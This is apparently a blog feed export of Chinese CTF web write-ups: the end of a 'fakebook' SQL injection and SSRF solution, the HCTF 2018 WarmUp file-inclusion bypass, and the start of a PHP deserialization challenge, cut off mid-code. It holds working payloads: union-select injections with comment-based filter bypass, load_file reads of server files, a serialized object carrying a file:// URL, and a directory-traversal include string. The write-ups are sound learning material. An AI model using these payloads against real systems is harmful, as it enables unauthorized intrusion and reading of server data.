alt="在这里插入图片描述"><br>访问，下载，得到源码</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $blog = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> function __construct($name, $age, $blog)</span><br><span class="line">    &#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;name = $name;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;age = (<span class="keyword">int</span>)$age;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">function <span class="title">get</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $ch = <span class="built_in">curl_init</span>();</span><br><span class="line"></span><br><span class="line">        <span class="built_in">curl_setopt</span>($ch, CURLOPT_URL, $url);</span><br><span class="line">        <span class="built_in">curl_setopt</span>($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        $output = <span class="built_in">curl_exec</span>($ch);</span><br><span class="line">        $httpCode = <span class="built_in">curl_getinfo</span>($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>($httpCode == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">curl_close</span>($ch);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> function <span class="title">getBlogContents</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;<span class="built_in">get</span>($<span class="keyword">this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> function <span class="title">isValidBlog</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $blog = $<span class="keyword">this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">preg_match</span>(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, $blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>先进行页面功能分析。<br>常规注册并登录，发现登录后url存在注入点。</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">view.php?no=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span></span><br><span class="line">#成功运行</span><br><span class="line">view.php?no=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span></span><br><span class="line">#成功运行，说明此处存在sql注入点。</span><br><span class="line">view.php?no=<span class="number">1</span> order by <span class="number">5</span></span><br><span class="line">#<span class="number">4</span>的时候不报错，<span class="number">5</span>的时候报错，证明有<span class="number">4</span>个字段</span><br><span class="line">view.php?no=<span class="number">-1</span> <span class="keyword">union</span> select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span></span><br><span class="line"><span class="meta">#no hack~应该是union被过滤了</span></span><br><span class="line">view.php?no=<span class="number">-1</span> <span class="keyword">union</span><span class="comment">/**/</span>select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span></span><br><span class="line">#成功有回显</span><br><span class="line">view.php?no=<span class="number">-1</span> <span class="keyword">union</span><span class="comment">/**/</span>select <span class="number">1</span>,<span class="built_in">database</span>(),<span class="number">3</span>,<span class="number">4</span> </span><br><span class="line">#成功爆出数据库的名称fakebook</span><br><span class="line">view.php?no=<span class="number">-1</span> <span class="keyword">union</span><span class="comment">/**/</span>select <span class="number">1</span>,<span class="built_in">group_concat</span>(table_name),<span class="number">3</span>,<span class="number">4</span> from information_schema.tables.where table_schema=<span class="built_in">database</span>()</span><br><span class="line">#成功爆出表名为users</span><br><span class="line">view.php?no=<span class="number">-1</span> <span class="keyword">union</span><span class="comment">/**/</span>select <span class="number">1</span>,<span class="built_in">group_concat</span>(column_name),<span class="number">3</span>,<span class="number">4</span> from information_schema.columns where table_name=<span class="string">&#x27;users&#x27;</span></span><br><span class="line">#成功爆出字段名：no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</span><br><span class="line">view.php?no=<span class="number">-1</span> <span class="keyword">union</span><span class="comment">/**/</span>select <span class="number">1</span>,<span class="built_in">group_concat</span>(data),<span class="number">3</span>,<span class="number">4</span> from users</span><br><span class="line">#成功爆出注册时的序列化账户</span><br><span class="line">#O:<span class="number">8</span>:<span class="string">&quot;UserInfo&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;tzzzez&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;i:<span class="number">20</span>;s:<span class="number">4</span>:<span class="string">&quot;blog&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;tzzzez.blog&quot;</span>;&#125;</span><br><span class="line">view.php?no=<span class="number">-1</span> <span class="keyword">union</span><span class="comment">/**/</span>select <span class="number">1</span>,<span class="built_in">load_file</span>(<span class="string">&#x27;/var/www/html/flag.php&#x27;</span>),<span class="number">3</span>,<span class="number">4</span></span><br><span class="line">#借助load_file函数读取flag.php网页内容</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="方法1："><a href="#方法1：" class="headerlink" title="方法1："></a>方法1：</h3><p>借助load_file函数读取结果</p><blockquote><p>view.php?no=-1 union/**/select 1,load_file(‘/var/www/html/flag.php’),3,4</p></blockquote><p>f12查看源码可以找到flag<br><img src="https://img-blog.csdnimg.cn/20210517212403125.png" alt="在这里插入图片描述"></p><h3 id="方法2："><a href="#方法2：" class="headerlink" title="方法2："></a>方法2：</h3><p>借助ssrf，通过get函数读取/flag.php内容，由于被过滤，所以无法直接读取。因此借助file协议读取网页内容。读取的payload为：</p><blockquote><p>file:///var/www/html/flag.php</p></blockquote><p>函数中的user还有一层序列化，此时可以通过sql爆破出的user的序列化进行构建，也可以通过源码进行构造。（混子表示完全看不懂…）</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $blog = <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> <span class="built_in">UserInfo</span>();</span><br><span class="line">$a-&gt;name = <span class="string">&#x27;tzzzez&#x27;</span>;</span><br><span class="line">$a-&gt;age=<span class="number">20</span>;</span><br><span class="line">$a-&gt;blog=<span class="string">&#x27;file:///var/www/html/flag.php&#x27;</span>;</span><br><span class="line"><span class="function">echo <span class="title">serialize</span><span class="params">($a)</span></span>;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210517212654796.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUyNzEwOTQ3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>最后通过sql注入，返回file读取的内容</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">view.php?no=<span class="number">-1</span>%<span class="number">20u</span>nion<span class="comment">/**/</span>select%<span class="number">201</span>,<span class="number">2</span>,<span class="number">3</span>,%<span class="number">27</span>O:<span class="number">8</span>:<span class="string">&quot;UserInfo&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;tzzzez&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;i:<span class="number">20</span>;s:<span class="number">4</span>:<span class="string">&quot;blog&quot;</span>;s:<span class="number">29</span>:<span class="string">&quot;file:///var/www/html/flag.php&quot;</span>;&#125;%<span class="number">27</span></span><br></pre></td></tr></table></figure><p>f12查看源码里找到flag<br><img src="https://img-blog.csdnimg.cn/202105172135475.png" alt="在这里插入图片描述"></p><h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>混子不配得到flag…</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[HCTF 2018]WarmUp(PHP 代码审计)</title>
      <link href="/2021/11/11/%5BHCTF%202018%5DWarmUp(PHP%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)/"/>
      <url>/2021/11/11/%5BHCTF%202018%5DWarmUp(PHP%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>buuctf里web的第一道题，比较怀念，依然不会写。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>打开题目，是一个滑稽图<br><img src="https://img-blog.csdnimg.cn/20210516210712121.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUyNzEwOTQ3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>看不出什么，查看网页源代码，发现了source.php<br><img src="https://img-blog.csdnimg.cn/20210516210901476.png" alt="在这里插入图片描述"><br>访问source.php，发现以下source.php中的代码，<br>有一说一，我也看不懂是什么意思，看别人的题解知道，这是index.php的源代码</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    class emmm</span><br><span class="line">    &#123;</span><br><span class="line">        public static <span class="keyword">function</span> checkFile(&amp;<span class="variable">$page</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! isset(<span class="variable">$page</span>) || !is_string(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="built_in">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="built_in">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="built_in">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);</span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="built_in">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! empty(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; is_string(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        include <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="built_in">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>发现hint.php，看一下，提示flag在/ffffllllaaaagggg里面，咱也不知道怎么访问，就跑去看看大佬的题解<br><img src="https://img-blog.csdnimg.cn/20210516211728347.png" alt="在这里插入图片描述"><br>看大佬题解知道接下来要分析代码，咱也不会，就看看大佬的分析过程</p><h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (! <span class="built_in">empty</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">       &amp;&amp; <span class="built_in">is_string</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">       &amp;&amp; emmm::<span class="built_in">checkFile</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">   ) &#123;</span><br><span class="line">       include $_REQUEST[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">       exit;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       echo <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">   &#125;  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>整体利用的漏洞就是代码最后的include函数，利用文件包含漏洞<br>因此，最后的if条件语句是关键，即需要满足 <em><strong>if(true &amp;&amp; true &amp;&amp; true)</strong></em> ，才会执行include函数，否则输出滑稽图。<br>! empty($_REQUEST[‘file’]满足true简单<br>is_string($_REQUEST[‘file’]满足true简单<br>emmm::checkFile($_REQUEST[‘file’]满足true，需要执行emmm类中的checkFile函数，使得该函数最终返回true才可以</p><p>整体细节详解（checkFile函数的目标就是返回true）：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">   &#123;</span></span><br><span class="line">       <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> function <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span><br><span class="line"><span class="function">       </span>&#123;</span><br><span class="line">           $whitelist = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">           <span class="keyword">if</span> (! <span class="built_in">isset</span>($page) || !<span class="built_in">is_string</span>($page)) &#123;</span><br><span class="line">               echo <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">               <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span> (<span class="built_in">in_array</span>($page, $whitelist)) &#123;</span><br><span class="line">               <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           $_page = <span class="built_in">mb_substr</span>(</span><br><span class="line">               $page,</span><br><span class="line">               <span class="number">0</span>,</span><br><span class="line">               <span class="built_in">mb_strpos</span>($page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">           );</span><br><span class="line">           <span class="keyword">if</span> (<span class="built_in">in_array</span>($_page, $whitelist)) &#123;</span><br><span class="line">               <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           $_page = <span class="built_in">urldecode</span>($page);</span><br><span class="line">           $_page = <span class="built_in">mb_substr</span>(</span><br><span class="line">               $_page,</span><br><span class="line">               <span class="number">0</span>,</span><br><span class="line">               <span class="built_in">mb_strpos</span>($_page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">           );</span><br><span class="line">           <span class="keyword">if</span> (<span class="built_in">in_array</span>($_page, $whitelist)) &#123;</span><br><span class="line">               <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">           &#125;</span><br><span class="line">           echo <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (! <span class="built_in">empty</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">       &amp;&amp; <span class="built_in">is_string</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">       &amp;&amp; emmm::<span class="built_in">checkFile</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">   ) &#123;</span><br><span class="line">       include $_REQUEST[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">       exit;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       echo <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">   &#125;  </span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>、定义了一个类emm</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、在类emm中定义了一个<span class="built_in">checkFile</span>()函数</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>、不执行函数，先判断下面的<span class="keyword">if</span>语句：<span class="keyword">if</span> (<span class="literal">true</span> &amp;&amp; <span class="literal">true</span> &amp;&amp; <span class="literal">true</span>)才能执行include函数，所</span><br><span class="line">以需要满足如下要求：</span><br><span class="line">(<span class="number">1</span>)$_REQUEST[<span class="string">&#x27;file&#x27;</span>]不为空，!<span class="built_in">empty</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>]才会返回<span class="literal">true</span>；</span><br><span class="line">(<span class="number">2</span>)$_REQUEST[<span class="string">&#x27;file&#x27;</span>]是字符串，<span class="built_in">is_string</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>]才会返回<span class="literal">true</span>;</span><br><span class="line">(<span class="number">3</span>)<span class="built_in">checkFile</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>]返回<span class="literal">true</span>，emmm::<span class="built_in">checkFile</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>]才</span><br><span class="line">会返回<span class="literal">true</span>；</span><br><span class="line">因此，满足这三个条件，最后才能执行include函数</span><br><span class="line"></span><br><span class="line"><span class="number">4</span>、接下来看看<span class="built_in">checkFile</span>()函数中的内容</span><br><span class="line">(<span class="number">1</span>)第一个<span class="keyword">if</span>不能<span class="keyword">return</span> flase，因为这里不能执行&#123;&#125;中的语句，因为不管<span class="keyword">return</span> <span class="literal">true</span>或者<span class="keyword">return</span> <span class="literal">false</span>，都会</span><br><span class="line">终止当前函数的执行，所以需要满足<span class="keyword">if</span> (<span class="literal">false</span> || <span class="literal">false</span>)才能继续执行下面的代码，即，$page存在并且是字符串;</span><br><span class="line">(<span class="number">2</span>)第<span class="number">2</span>个语句可以执行，返回<span class="literal">true</span></span><br><span class="line">那么，就需要$whitelist中存在$page</span><br><span class="line">注：in_array函数是检查数组中是否存在某个值(找到<span class="literal">true</span>；找不<span class="literal">false</span>),特别注意这是在数组的键值中找，不包括键</span><br><span class="line"></span><br><span class="line"><span class="number">5</span>、这样的话我们就可以构造<span class="built_in">payload</span></span><br><span class="line">(<span class="number">1</span>)测试payload1：</span><br><span class="line">http:<span class="comment">//111.198.29.45:56708/index.php?file=source.php</span></span><br><span class="line">执行了source.php，输出了里面的内容</span><br><span class="line"></span><br><span class="line">(<span class="number">2</span>)测试payload2：</span><br><span class="line">http:<span class="comment">//111.198.29.45:56708/index.php?file=source.php../../../../../ffffllllaaaagggg</span></span><br><span class="line">我想得到ffffllllaaaagggg时就出问题了，因为ffffllllaaaagggg不在$whitelist数组的键值中，并且</span><br><span class="line">继续执行代码后，下面$_page=source.php../../../../../../../ffffllllaaaagggg，第<span class="number">3</span>个<span class="keyword">if</span>语句<span class="literal">false</span>，</span><br><span class="line">urldecode后$_page=source.php../../../../../../../ffffllllaaaagggg，mb_substr后还是这个，第<span class="number">4</span></span><br><span class="line">个<span class="keyword">if</span>语句还是<span class="literal">false</span>，最后输出you can<span class="number">&#x27;</span>t see it，还<span class="keyword">return</span> <span class="literal">false</span>，这还玩啥</span><br><span class="line"></span><br><span class="line">该如何解决？我需要include ffffllllaaaagggg文件，而且需要使用../，怎样绕过？</span><br><span class="line">注意到<span class="built_in">mb_strpos</span>($page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)没，我们构造一个?即可</span><br><span class="line"></span><br><span class="line">(<span class="number">3</span>)测试payload3：</span><br><span class="line">http:<span class="comment">//111.198.29.45:56708/index.php?file=source.php?../../../../../../ffffllllaaaagggg</span></span><br><span class="line">构造?的话，第<span class="number">2</span>个<span class="keyword">if</span>语句就不能返回<span class="literal">true</span>了，第<span class="number">3</span>个<span class="keyword">if</span>语句一样，也不能执行<span class="keyword">return</span>语句，第<span class="number">4</span>个<span class="keyword">if</span>语句需要满足<span class="keyword">if</span></span><br><span class="line">(<span class="literal">true</span>)，因为需要执行&#123;&#125;中的内容，最后使得<span class="built_in">checkFile</span>()函数返回的布尔类型为<span class="built_in"><span class="literal">true</span></span></span><br><span class="line"></span><br><span class="line">(<span class="number">4</span>)payload3执行流程：此时file=source.php?../../../../../../ffffllllaaaagggg</span><br><span class="line">第<span class="number">1</span>个<span class="keyword">if</span>返回<span class="literal">false</span></span><br><span class="line">第<span class="number">2</span>个<span class="keyword">if</span>返回<span class="literal">false</span></span><br><span class="line">$_page=source.php</span><br><span class="line">第<span class="number">3</span>个<span class="keyword">if</span>返回<span class="literal">true</span>，退出checkFile函数，此时核心代码中已满足<span class="keyword">if</span>(<span class="literal">true</span>&amp;&amp;<span class="literal">true</span>&amp;&amp;<span class="literal">true</span>)，即执行include函数</span><br><span class="line">最后<span class="built_in">include</span>(source.php?../../../../../../ffffllllaaaagggg)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>分析得到payload如下</p><blockquote><p><a href="http://xxx/index.php?file=source.php%253f../../../../../ffffllllaaaagggg">http://xxx/index.php?file=source.php%253f../../../../../ffffllllaaaagggg</a></p></blockquote><p>访问即可得到flag。</p><p>执行流程：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">第<span class="number">1</span>个<span class="keyword">if</span>返回<span class="literal">false</span></span><br><span class="line">第<span class="number">2</span>个<span class="keyword">if</span>返回<span class="literal">false</span></span><br><span class="line">$_page=source.php%<span class="number">3f</span>../../../../../ffffllllaaaagggg</span><br><span class="line">第<span class="number">3</span>个<span class="keyword">if</span>返回<span class="literal">false</span></span><br><span class="line">urldecode执行后，$_page=source.php?../../../../../ffffllllaaaagggg</span><br><span class="line">执行mb_substr后$_page=source.php</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">下面核心代码执行同理</span><br><span class="line">最后<span class="built_in">include</span>(source.php%<span class="number">253f</span>../../../../../ffffllllaaaagggg)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>（1）只要函数中return执行了，就会立即结束函数的执行，继续执行函数外的代码；<br>（2）||表示任意||两边只要有一边是true，整体就返回true；<br>（3）in_array函数是检查数组中是否存在某个值(找到true；找不false),特别注意这是在数组的键值中找，不包括键；<br>（4）mb_strpos查找目标首次出现的位置，从0开始；<br>（5）mb_substr返回字符串，特别注意的是：mb_strpos获取的数字，在mb_substr不是从0开始，而是代表返回的长度。</p><h2 id="最后说一句"><a href="#最后说一句" class="headerlink" title="最后说一句"></a>最后说一句</h2><p>其实看了题解也没太看懂，存着，有空多看看，总有一天会看懂的。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[网鼎杯 2020 青龙组]AreUSerialz</title>
      <link href="/2021/11/11/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84%5DAreUSerialz(PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96)/"/>
      <url>/2021/11/11/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84%5DAreUSerialz(PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96)/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>真的不会写</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>进入链接，一大串代码来袭</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">&lt;?<span class="function">php</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">include</span><span class="params">(<span class="string">&quot;flag.php&quot;</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">highlight_file</span>(__FILE__);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> &#123;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $op;</span><br><span class="line">    <span class="keyword">protected</span> $filename;</span><br><span class="line">    <span class="keyword">protected</span> $content;</span><br><span class="line"></span><br><span class="line">    function __construct() &#123;</span><br><span class="line">        $op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        $filename = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        $content = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;<span class="built_in">process</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> function <span class="title">process</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($<span class="keyword">this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;<span class="built_in">write</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>($<span class="keyword">this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            $res = $<span class="keyword">this</span>-&gt;<span class="built_in">read</span>();</span><br><span class="line">            $<span class="keyword">this</span>-&gt;<span class="built_in">output</span>($res);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $<span class="keyword">this</span>-&gt;<span class="built_in">output</span>(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> function <span class="title">write</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">isset</span>($<span class="keyword">this</span>-&gt;filename) &amp;&amp; <span class="built_in">isset</span>($<span class="keyword">this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">strlen</span>((string)$<span class="keyword">this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                $<span class="keyword">this</span>-&gt;<span class="built_in">output</span>(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="built_in">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            $res = <span class="built_in">file_put_contents</span>($<span class="keyword">this</span>-&gt;filename, $<span class="keyword">this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>($res) $<span class="keyword">this</span>-&gt;<span class="built_in">output</span>(<span 